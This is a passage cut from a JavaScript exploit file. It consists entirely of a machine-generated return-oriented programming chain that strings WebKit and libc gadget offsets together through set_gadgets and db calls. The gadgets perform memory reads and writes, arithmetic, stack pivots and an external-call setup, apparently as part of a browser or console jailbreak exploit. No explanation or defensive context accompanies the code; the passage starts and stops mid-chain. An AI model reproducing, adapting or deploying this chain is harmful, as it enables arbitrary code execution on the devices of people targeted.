db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+83488, //L438
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+83504, //L439
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L438:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L439:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+83664, //L443
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+83632, //L441
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+83648, //L442
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L440:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L441:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L442:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L443:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+83720, //L444
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L444:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+83848, //L447
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+83864, //L448
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+83832, //L446
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L446:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L447:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L448:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+83960, //L450
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+83944, //L449
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L449:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L450:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+84056, //L452
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L451:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L452:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+84160, //L455
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+84144, //L454
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L454:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L455:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+84304, //L459
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+84272, //L457
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+84288, //L458
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L457:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L458:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L459:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+84376, //L460
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L460:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+84432, //L462
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L462:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+84528, //L465
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L464:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L465:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+84632, //L468
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+84616, //L467
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L467:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L468:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+84792, //L471
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+84824, //L473
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+84776, //L470
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+84808, //L472
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L470:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L471:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L472:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L473:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+84936, //L474
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+84968, //L476
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+84952, //L475
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L474:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L475:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L476:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+85056, //L477
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L477:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+85112, //L479
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L479:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+85184, //L481
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L481:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+85240, //L483
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L483:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+887232, //mov [rax], cl
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
//L485:
libc_base+713278, //pop rsi
ropchain+85344, //L487
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L486:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L487:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+85448, //L490
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+85432, //L489
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L489:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L490:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+85608, //L493
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+85640, //L495
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+85592, //L492
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+85624, //L494
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L492:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L493:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L494:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L495:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+85736, //L497
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+85720, //L496
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L496:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L497:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+85824, //L499
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L498:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L499:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+85896, //L501
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L500:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L501:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+713278, //pop rsi
ropchain+85960, //L503
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L503:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+489696, //pop rsp
ropchain+74104, //L202
//L235:
libc_base+713278, //pop rsi
ropchain+86072, //L506
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L505:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L506:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+86176, //L509
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+86160, //L508
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L508:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L509:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+86288, //L511
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+86320, //L513
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+86304, //L512
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L511:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L512:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L513:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+86424, //L514
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+86440, //L515
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L514:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L515:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+86560, //L516
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+86544, //L517
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L517:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L516:
db([0, 0]); // 0x0
set_gadgets([
libc_base+713278, //pop rsi
ropchain+86648, //L519
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+86632, //L518
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L518:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L519:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+86752, //L520
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+86768, //L521
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L520:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L521:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+86888, //L522
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+86872, //L523
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L523:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L522:
db([0, 0]); // 0x0
//_create_extcall:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+86960, //L525
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L525:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+87024, //L526
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L526:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L528:
db([32, 0]); // 0x20
set_gadget(libc_base+772328,); //pop rcx
//L529:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+87192, //L532
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+87176, //L531
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L531:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L532:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+87296, //L535
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+87312, //L536
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L534:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L535:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L536:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+2989859, //mov [rax], rcx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L538:
db([16, 0]); // 0x10
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+87456, //L541
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+87440, //L540
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L540:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L541:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+87600, //L545
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+87568, //L543
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+87584, //L544
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L543:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L544:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L545:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+87672, //L546
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L546:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+87728, //L548
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L548:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+87840, //L552
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L550:
db([1, 0]); // 0x1
set_gadget(libc_base+772328,); //pop rcx
//L551:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L552:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+87920, //L553
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+87936, //L554
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L553:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L554:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+88024, //L555
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L555:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+88080, //L557
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L557:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+88200, //L560
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L559:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L560:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+88304, //L563
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+88288, //L562
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L562:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L563:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+88448, //L567
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+88416, //L565
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+88432, //L566
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L565:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L566:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L567:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+88520, //L568
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L568:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+88576, //L570
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L570:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+88688, //L574
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L572:
db([0, 0]); // 0x0
set_gadget(libc_base+772328,); //pop rcx
//L573:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L574:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+88768, //L575
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+88784, //L576
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L575:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L576:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+88872, //L577
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L577:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+88928, //L579
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L579:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+89000, //L581
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L581:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+89056, //L583
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L583:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L585:
pivot_addr,
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+89208, //L587
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L586:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L587:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+89312, //L590
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+89296, //L589
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L589:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L590:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+89456, //L594
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+89424, //L592
